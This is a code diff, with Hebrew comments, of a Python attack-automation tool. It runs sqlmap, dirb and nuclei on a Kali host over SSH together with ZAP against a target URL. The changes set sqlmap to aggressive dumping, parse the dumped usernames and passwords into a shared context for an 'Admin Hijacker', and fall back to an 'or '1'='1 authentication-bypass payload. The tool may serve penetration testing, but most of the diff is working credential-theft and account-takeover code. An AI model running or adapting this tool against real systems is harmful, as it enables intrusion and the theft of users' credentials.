@@ -152,38 +152,52 @@ def announce_sqlmap_placeholder(kali_ip: str) -> None:
 
   os.system(f'echo "SQL Injection detected. Would now launch sqlmap on the Kali machine {kali_ip}."')
 
-def run_remote_sqlmap(target_url: str, kali_ip: str) -> None:
-    print(f"\n[!] Initiating automated SQLMap attack on raw URL: {target_url}")
+def run_remote_sqlmap(target_url: str, param: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating Surgical SQLMap attack on: {target_url}")
     
-    import re
-    clean_url = re.sub(r'q=.*', 'q=1*', target_url)
-    print(f"[*] Sanitized and targeted URL for SQLMap: {clean_url}")
+    # 1. מיקוד דינמי (Targeting)
+    # אם יש פרמטר ידוע (מ-ZAP) נתקוף אותו, אחרת נגיד ל-SQLMap לסרוק כל טופס שיש בעמוד
+    param_flag = f"-p \"{param}\"" if param else "--forms --crawl=1"
     
-    username = os.getenv("KALI_USER", "kali")
-    password = os.getenv("KALI_PASSWORD", "kali")
+    # 2. הרחבת פני השטח של התקיפה (Attack Surface)
+    # בנינו פקודה שמאפשרת תקיפות על JSON (--data) ועל Headers, וחשוב מכל: הוספנו תמיכה ברמת סיכון גבוהה יותר וטכניקות עמוקות.
+    # --level=3: בודק גם כותרות (Headers) ועוגיות (Cookies).
+    # --risk=3: כולל שאילתות UPDATE או OR, מה שמגדיל את הסיכוי למצוא Authentication Bypass (or '1'='1).
+    sqlmap_cmd = f"sqlmap -u \"{target_url}\" {param_flag} --batch --level=3 --risk=3 --threads=3 --dump --start=1 --stop=5"
     
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    print(f"[*] Executing payload: {sqlmap_cmd}")
+    out, err = execute_ssh_command(kali_ip, sqlmap_cmd)
     
-    try:
-        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
-        ssh.connect(hostname=kali_ip, username=username, password=password)
-        
-        # שינוי הפקודה כך שתשאב את התוכן של טבלת המשתמשים (Users)
-        sqlmap_cmd = f"sqlmap -u \"{clean_url}\" --batch --tables --dbms=sqlite --technique=BEU --level=2 --risk=2 --random-agent --flush-session"
-        print(f"[*] Executing payload: {sqlmap_cmd}")
-        
-        stdin, stdout, stderr = ssh.exec_command(sqlmap_cmd)
-        output = stdout.read().decode('utf-8')
-        
-        print("\n=== SQLMAP OUTPUT (USERS TABLE DUMP) ===")
-        print(output)
-        print("========================================\n")
+    print("\n=== SQLMAP OUTPUT ===")
+    print("\n".join(out.split('\n')[-35:])) 
+    print("=======================\n")
+    
+    print("[*] Parsing SQLMap output for credentials...")
+    found_creds = False
+    
+    # 3. חילוץ דינמי של יוזרים וסיסמאות מהטבלה
+    table_rows = re.findall(r'\|\s*([a-zA-Z0-9_\.@]+)\s*\|\s*([a-zA-Z0-9_\.@\!]+)\s*\|', out)
+    for row in table_rows:
+        user, pwd = row
+        # מנקים "זבל" כמו מילים שמורות של SQL או קווים, ומשאירים רק יוזרים אמיתיים
+        if user.lower() not in ['id', 'username', 'email', 'password', 'pass'] and len(pwd) > 2 and not re.match(r'^[-_]+$', pwd):
+            EXPLOIT_CONTEXT["extracted_credentials"].append({"user": user, "pass": pwd})
+            found_creds = True
             
-    except Exception as e:
-        print(f"[-] Automated attack failed: {e}")
-    finally:
-        ssh.close()
+    if found_creds:
+        print(f"[+] Successfully extracted credentials! Saved to Global Context for Admin Hijacker.")
+    else:
+        # 4. הבחנה ב-Authentication Bypass גם אם אין טבלה
+        # אם SQLMap מצא פגיעות אבל לא הצליח (או לא ניסה) למשוך טבלה, הוא כותב "appears to be injectable".
+        # זה רמז עבורנו שה-' or '1'='1 הצליח, גם אם לא קיבלנו יוזר וסיסמה!
+        if "appears to be injectable" in out.lower() or "vulnerable" in out.lower():
+             print("[!] SQLMap detected a vulnerability (likely Auth Bypass), but could not dump tables.")
+             print("[*] Hinting Admin Hijacker to attempt generic bypass payloads (e.g. 'or '1'='1).")
+             # נוסיף יוזר דמה עם פיילוד של BYPASS כדי שה-Hijacker ינסה אותו
+             EXPLOIT_CONTEXT["extracted_credentials"].append({"user": "admin' or '1'='1--", "pass": "admin"})
+
+    # משחרר את הנעילה של ה-Hijacker
+    EXPLOIT_CONTEXT["sqlmap_finished"].set()
 
 def run_remote_dirb(target_url: str, kali_ip: str) -> None:
     print(f"\n[*] Launching Dirb for directory discovery on: {target_url}")
@@ -200,7 +214,7 @@ def run_remote_dirb(target_url: str, kali_ip: str) -> None:
         ssh.connect(hostname=kali_ip, username=username, password=password)
         
         # בניית הפקודה - Dirb סורק את כתובת הבסיס שמצאנו
-        dirb_cmd = f"dirb {target_url}" 
+        dirb_cmd = f"dirb {target_url} -S" 
         print(f"[*] Executing payload: {dirb_cmd}")
         
         # הרצה
@@ -776,6 +790,9 @@ def main() -> int:
     nuclei_thread = threading.Thread(target=run_remote_nuclei, args=(target_url, kali_ip, nuclei_alerts))
     nuclei_thread.start()
 
+    dirb_thread = threading.Thread(target=run_remote_dirb, args=(target_url, kali_ip))
+    dirb_thread.start()
+
     zap = create_zap_client(api_key)
     print(f"[*] ZAP Engine Connected. Initializing spider...")
     zap.urlopen(target_url)
@@ -790,6 +807,7 @@ def main() -> int:
     print(f"[*] Scanners finished. ZAP found {len(zap_alerts)} alerts.")
     
     nuclei_thread.join() 
+    dirb_thread.join()
     
     # איחוד ממצאים
     all_findings = zap_alerts.copy() 
